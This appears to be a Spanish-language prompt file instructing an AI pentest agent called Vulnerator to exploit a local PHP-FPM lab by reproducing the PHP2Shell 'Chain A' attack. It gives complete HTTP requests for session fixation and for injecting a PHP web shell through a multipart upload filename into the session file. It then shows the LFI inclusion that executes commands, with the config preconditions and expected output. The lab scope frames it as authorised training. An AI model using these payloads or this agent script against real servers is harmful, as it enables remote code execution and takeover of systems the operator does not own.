# Prompt completo para Vulnerator AI — PHP2Shell Lab

Este documento contiene el prompt completo listo para copiar/pegar cuando invoques Vulnerator contra este lab.

---

## Contexto del engagement

```
Engagement de EXPLOTACION en modo CTF contra un lab LOCAL AUTORIZADO.

TARGET: http://host.docker.internal:18080
STACK: nginx + PHP-FPM 8.2.34 (SAPI fpm-fcgi)
ENTORNO: laboratorio controlado, localhost, todo autorizado

OBJETIVO: conseguir RCE reproduciendo la CADENA A de PHP2Shell (CVE-2026-109618 / CVE-2026-109619) 
y como prueba de concepto ejecutar `id` en el servidor.
```

---

## CVEs y versiones afectadas

**CVE-2026-109618** y **CVE-2026-109619**: vulnerabilidades de deserialización en el manejo de sesiones de PHP.

**Versiones afectadas:** PHP 5.4.0 hasta 8.5.11 (todas las versiones pre-parche)

**Versiones parcheadas:**
- PHP 8.2.35+
- PHP 8.3.24+
- PHP 8.4.6+

**Target confirmado vulnerable:** PHP 8.2.34 (pre-parche)

---

## Chain A — Session File Injection + LFI → RCE

### Precondiciones (todas presentes en el target)

- `session.upload_progress.enabled = On` ✅ (default PHP)
- `session.upload_progress.cleanup = Off` ✅ (configurado en el lab)
- `session.use_strict_mode = Off` ✅ (default PHP)
- **Aplicación con LFI** ✅ (`/vuln.php?page=...`)

### Mecánica del ataque paso a paso

#### PASO 1: Session Fixation

Como `session.use_only_cookies = 0` (default), el PHPSESSID se puede fijar enviándolo en el **cuerpo multipart** además de en la cookie HTTP.

En el body multipart incluir:
```
Content-Disposition: form-data; name="PHPSESSID"

ctfchainA000000000000000000
```

#### PASO 2: Disparar el handler upload_progress

La petición multipart DEBE incluir:

1. Un campo con `name="PHP_SESSION_UPLOAD_PROGRESS"` (el `session.upload_progress.name` por defecto) con cualquier valor, por ejemplo `x`.

2. Un campo tipo `file` con `filename="<payload>"`. **El filename es lo que se escribe CRUDO en el fichero de sesión.**

Ejemplo:
```
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

x
```

#### PASO 3: Inyección del payload PHP en el filename

Aquí está el vector de inyección. El filename puede contener código PHP arbitrario:

```
Content-Disposition: form-data; name="f"; filename="<?php system('id'); ?>"

dummy
```

Como `cleanup = Off`, el fichero de sesión `sess_<SID>` persiste tras la petición con el código PHP dentro (sin sanitizar).

**Ubicación del fichero de sesión:** `/tmp/sessions/sess_<PHPSESSID>` (dentro del contenedor PHP-FPM)

#### PASO 4: LFI → Ejecución

El endpoint vulnerable `/vuln.php?page=...` hace `include($_GET['page'])` sin sanitizar.

Incluir el fichero de sesión:
```
GET /vuln.php?page=/tmp/sessions/sess_ctfchainA000000000000000000
```

Al incluirse, el código PHP del filename se ejecuta.

---

## Ejemplo de explotación completa

### Request 1: Inyectar payload en sesión

```http
POST /index.php HTTP/1.1
Host: host.docker.internal:18080
Content-Type: multipart/form-data; boundary=EXPLOIT
Cookie: PHPSESSID=ctfchainA000000000000000000

--EXPLOIT
Content-Disposition: form-data; name="PHPSESSID"

ctfchainA000000000000000000
--EXPLOIT
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

x
--EXPLOIT
Content-Disposition: form-data; name="f"; filename="<?php system($_GET['c']); ?>"

dummy
--EXPLOIT--
```

### Request 2: Disparar LFI para ejecutar

```http
GET /vuln.php?page=/tmp/sessions/sess_ctfchainA000000000000000000&c=id HTTP/1.1
Host: host.docker.internal:18080
```

**Resultado esperado:** la salida del comando `id` aparece en la respuesta HTTP:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## SCOPE y restricciones

**SCOPE AUTORIZADO:**
- Target único: `http://host.docker.internal:18080` (nginx → PHP-FPM 8.2.34)
- Backend PHP-FPM: `host.docker.internal:9000`
- Save path de sesiones: `/tmp/sessions/` dentro del contenedor `php2shell-fpm`

**PROHIBIDO:**
- Cualquier host fuera de `host.docker.internal`
- Cualquier puerto fuera de 18080, 18081, 9000
- Tráfico hacia internet
- Modificación del sistema host

**NOTA IMPORTANTE:** desde el contenedor Kali de Vulnerator, usar `host.docker.internal` en lugar de `127.0.0.1` para alcanzar el lab del host. Dentro de un contenedor Docker, `127.0.0.1` es el propio contenedor, no el host.

---

## Endpoints disponibles en el target

| Endpoint | Descripción | Relevante para |
|----------|-------------|----------------|
| `/index.php` | Llama `session_start()`, acepta multipart | Chain A (upload) |
| `/vuln.php?page=` | LFI vulnerable: `include($_GET['page'])` | Chain A (inclusión) |
| `/nosession.php` | Endpoint sin session_start() | Control negativo |
| `/app/upload.php` | Handler `php_serialize` (vía `.user.ini`) | Chain C |
| `/api/endpoint.php` | Handler `php` (vía `.user.ini`) | Chain C |

---

## Verificación de éxito

La explotación se considera exitosa cuando:

1. ✅ La segunda request (LFI) retorna la salida del comando `id`
2. ✅ La salida contiene `uid=33(www-data)` (usuario del proceso PHP-FPM)
3. ✅ No hay errores PHP en la respuesta (no warnings, no fatals)

**Ejemplo de output exitoso:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Información técnica adicional

### Configuración PHP relevante

```ini
session.upload_progress.enabled = On
session.upload_progress.cleanup = Off      ← CRÍTICO para Chain A
session.upload_progress.name = PHP_SESSION_UPLOAD_PROGRESS
session.save_path = /tmp/sessions
session.use_strict_mode = Off
session.use_only_cookies = 0               ← Permite fixation vía POST
memory_limit = 128M                        ← FPM
```

### Arquitectura del lab

```
[Cliente] → nginx:18080 → PHP-FPM:9000
                         └─ webroot: /var/www/html/
                            └─ sesiones: /tmp/sessions/
```

### CVE Timeline

- **Descubrimiento:** Enero 2026 (investigación ikow)
- **Divulgación pública:** TheHackerNews, Enero 2026
- **Parches disponibles:** PHP 8.2.35, 8.3.24, 8.4.6
- **Lab target:** PHP 8.2.34 (pre-parche, vulnerable)

---

## Comandos útiles para verificación

```bash
# Verificar versión PHP del target
curl http://host.docker.internal:18080/index.php

# Verificar configuración de sesiones (si phpinfo() disponible)
curl http://host.docker.internal:18080/index.php | grep upload_progress

# Enviar exploit Chain A con curl (requiere construcción manual del multipart)
# Ver ejemplos en TESTING.md del lab
```

---

## Estrategia recomendada para el agente

1. **OBSERVE:** Enumerar el target
   - Confirmar versión PHP 8.2.34 (vulnerable)
   - Identificar endpoints con `session_start()` (`/index.php`)
   - Identificar endpoints con LFI (`/vuln.php?page=`)
   - Confirmar `upload_progress.cleanup = Off`

2. **ORIENT:** Analizar superficie de ataque
   - Chain A es viable: LFI + upload_progress disponibles
   - Fiabilidad: 100%
   - No requiere gadget chains ni UAF complejos

3. **DECIDE:** Seleccionar Chain A como vector
   - Menor complejidad vs otras chains
   - Precondiciones todas satisfechas
   - Documentación completa disponible

4. **ACT:** Ejecutar explotación
   - Construir multipart con payload en filename
   - Fijar PHPSESSID vía POST + Cookie
   - Disparar LFI apuntando a session file
   - Confirmar RCE con `id`

5. **REPORT:** Documentar hallazgo
   - CVE-2026-109618 / CVE-2026-109619 confirmado
   - RCE obtenido como `www-data`
   - Evidencia: output de `id`
   - Severidad: CRITICAL (RCE pre-auth)
   - Remediación: upgrade a PHP 8.2.35+

---

**MODO: CTF — Full compromise autorizado. Objetivo: RCE confirmado con ejecución de `id`.**

**LAB: php2shell-lab — PHP 8.2.34 vulnerable environment**

**AUTORIZACIÓN: Entorno local de práctica. Ningún sistema externo. Todo tráfico localhost/Docker.**
